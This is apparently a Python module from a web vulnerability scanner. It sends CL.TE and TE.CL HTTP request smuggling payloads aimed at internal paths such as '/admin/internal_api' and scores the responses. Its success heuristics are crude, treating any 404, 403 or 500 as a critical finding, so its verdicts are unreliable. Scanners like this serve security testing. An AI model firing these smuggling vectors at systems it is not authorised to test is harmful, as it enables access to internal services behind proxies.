# path: core/scanners/http_smuggling_scanner.py

import aiohttp
import asyncio
from typing import Callable, List, Tuple, Dict, Optional, Any # Optional ve Any eklendi
from urllib.parse import urlparse

from core.scanners.base_scanner import BaseScanner

class HTTPSmugglingScanner(BaseScanner):
    """
    [AR-GE v1.0 - PROTOCOL MANIPULATOR]
    HTTP Request Smuggling (HRSmuggling) zafiyetini tarar.
    Özellikle Front-end (CDN/Proxy) ve Back-end sunucuları arasındaki
    protokol ayrıştırma (parsing) hatalarını hedef alır.
    """

    # KRİTİK DÜZELTME: CONCURRENCY_LIMIT sınıf seviyesinde tanımlandı
    CONCURRENCY_LIMIT: int = 5
    
    # KRİTİK DÜZELTME: TIMEOUT sınıf seviyesinde tanımlandı (RCE/SSRF'teki ile aynı)
    TIMEOUT: int = 12
    
    # Smuggling Vektörleri (Payload setleri)
    SMUGGLING_PAYLOADS = {
        # CL.TE (Content-Length öncelikli, Transfer-Encoding yoksayılır)
        "CL_TE": {
            "smuggled_path": "/admin/internal_api",
            "smuggled_body": "GET {smuggled_path} HTTP/1.1\r\nHost: {host}\r\n\r\n",
            "cl_value": 0, # CL değeri Smuggled Body'nin CL'si olacak
            "te_value": "chunked"
        },
        # TE.CL (Transfer-Encoding öncelikli, Content-Length yoksayılır)
        "TE_CL": {
            "smuggled_path": "/api/v1/healthcheck",
            "smuggled_body": "0\r\n\r\nGET {smuggled_path} HTTP/1.1\r\nHost: {host}\r\n\r\n",
            "cl_value": 4, # CL değeri Smuggled Body'nin CL'si olacak
            "te_value": "chunked"
        }
    }
    
    # Smuggling'in başarılı olduğunu gösteren sinyaller
    SUCCESS_SIGNALS = [
        "404 not found", 
        "500 internal server error", 
        "403 forbidden",
        "jenkins", # İç servis
        "grafana"
    ]
    
    # Baseline yanıt uzunluğundan bu oranda sapma beklenir (örn: 1.5 = %150)
    MAX_LENGTH_DEVIATION_RATIO = 1.5 
    
    @property
    def name(self):
        return "HTTP Request Smuggling Tarayıcısı"

    @property
    def category(self):
        return "HTTP_SMUGGLING"

    def __init__(self, logger, results_callback, request_callback: Callable[[], None]):
        super().__init__(logger, results_callback, request_callback)
        self.baseline_len = 0
        self.baseline_status = 0
        
    async def scan(
        self,
        url: str,
        session: aiohttp.ClientSession,
        completed_callback: Callable[[], None],
    ):
        self.log(f"[{self.category}] HTTP Request Smuggling analizi başlatılıyor...", "INFO")
        
        try:
            # 1. Baseline Alımı
            # HATA GİDERME: _fetch_baseline metodunun çıktısı kontrol ediliyor
            self.baseline_status, self.baseline_len = await self._fetch_baseline(url, session)
            
            # Kontrol: baseline_status 0 ise veya baseline_len None ise çık
            if self.baseline_status == 0 or self.baseline_len is None: 
                self.log(f"[{self.category}] Baseline alınamadı ({self.baseline_status}). Smuggling testi atlandı.", "WARNING")
                completed_callback()
                return
                 
            # 2. Testleri Yürüt
            # KRİTİK: Concurrency semaforu tanımlı değildi, BaseScanner'dan alıyoruz.
            semaphore = asyncio.Semaphore(self.CONCURRENCY_LIMIT) 
            tasks = []
            
            host = urlparse(url).netloc
            
            for test_name, payload_config in self.SMUGGLING_PAYLOADS.items():
                tasks.append(
                    self._test_smuggling_vector(url, host, test_name, payload_config, session, semaphore)
                )
            
            await asyncio.gather(*tasks)

        except Exception as e:
            self.log(f"[{self.category}] Kritik Smuggling Tarama Hatası: {type(e).__name__} ({e})", "CRITICAL")
            
        completed_callback()

    async def _fetch_baseline(self, url: str, session: aiohttp.ClientSession) -> Tuple[int, int]:
        """
        Baseline alımı. Head isteği kullanılır, sadece hız ve durum/uzunluk için.
        """
        try:
            # KRİTİK DÜZELTME: self.request_callback çağrımı burada yapılıyor.
            self.request_callback()
            # self.TIMEOUT yerine sınıf sabitini kullanıyoruz
            async with session.head(url, timeout=self.TIMEOUT, allow_redirects=True) as res: 
                # Content-Length yoksa 0 olarak kabul et (None yerine)
                content_len = int(res.headers.get("Content-Length", 0))
                return res.status, content_len
        except Exception:
            return 0, 0

    async def _test_smuggling_vector(self, url: str, host: str, test_name: str, config: Dict, session: aiohttp.ClientSession, semaphore: asyncio.Semaphore):
        """Tek bir Smuggling vektörünü dener (CL.TE, TE.CL vb.)."""
        
        async with semaphore:
            smuggled_body_raw = config["smuggled_body"].format(smuggled_path=config["smuggled_path"], host=host)
            
            if test_name == "CL_TE":
                # CL.TE: Front-end (CL), Back-end (TE) kullanır.
                full_payload = f"{config['cl_value']}\r\n{smuggled_body_raw}"
                
                headers = {
                    "Transfer-Encoding": config["te_value"],
                    "Content-Length": str(len(full_payload) + 2) # Front-end'in okuyacağı CL değeri (Gürültü için +2)
                }
                
            elif test_name == "TE_CL":
                # TE.CL: Front-end (TE), Back-end (CL) kullanır.
                smuggled_chunked = f"{hex(len(smuggled_body_raw))[2:]}\r\n{smuggled_body_raw}\r\n0\r\n\r\n"
                
                headers = {
                    "Transfer-Encoding": config["te_value"],
                    "Content-Length": str(len(smuggled_chunked) + len(smuggled_body_raw))
                }
                full_payload = smuggled_chunked

            # --- İSTEK YÜRÜTME (SMUGGLING) ---
            try:
                self.request_callback()
                
                # KRİTİK DÜZELTME: BaseScanner'daki _throttled_request kullanılıyor.
                # TIMEOUT'u sınıf sabitinden çekiyoruz
                response, _ = await self._throttled_request(
                    session, "POST", url, 
                    headers=headers, 
                    data=full_payload.encode('utf-8'),
                    allow_redirects=False, 
                    timeout=self.TIMEOUT
                )
                
                if response is None:
                    self.log(f"[{self.category} | {test_name}] İstek Başarısız: Sunucu yanıt vermedi/Timeout.", "WARNING")
                    return

                response_text = await response.text()
                low_response = response_text.lower()
                
                # 3. Sonuç Analizi
                await self._analyze_smuggling_result(response.status, low_response, test_name, config)

            except Exception as e:
                # KRİTİK DÜZELTME: Logda sadece exception tipini göster
                self.log(f"[{self.category} | {test_name}] İstek Hatası: {type(e).__name__}", "WARNING")

    async def _analyze_smuggling_result(self, status: int, response_lower: str, test_name: str, config: Dict):
        """Smuggling testinin başarılı olup olmadığını analiz eder."""
        
        smuggled_path = config["smuggled_path"]
        is_success = False
        
        # 1. Yanıt Kodu Sinyali
        # 404, 500, 403: Eğer normalde 200 dönen bir sayfadan bu kodları alırsak, 
        if status in [404, 403, 500, 502]:
             if status != self.baseline_status:
                 is_success = True
                 
        # 2. İçerik Sinyali (İç Servis Kelimeleri)
        if any(sig in response_lower for sig in self.SUCCESS_SIGNALS):
             is_success = True

        # 3. Uzunluk Sapması Sinyali (Baseline karşılaştırması)
        current_len = len(response_lower)
        if self.baseline_len > 0:
             # Mutlak farkın baseline'a oranı (Örneğin, %150'den fazla sapma)
             if abs(current_len - self.baseline_len) / self.baseline_len > self.MAX_LENGTH_DEVIATION_RATIO:
                 is_success = True
                 
        if is_success:
            self.add_result(
                self.category, 
                "CRITICAL", 
                f"KRİTİK HRSMUGGLING TESPİTİ ({test_name})! Yanıt Kodu: {status}. Hedef: {smuggled_path}. Protokol ayrıştırma zafiyeti (RCE/AT potansiyeli).",
                self._calculate_score_deduction("CRITICAL") * 1.5 # Ekstra yüksek skor
            )
            self.log(f"[{self.category}] KRİTİK BAŞARI! Smuggling Tipi: {test_name}", "CRITICAL")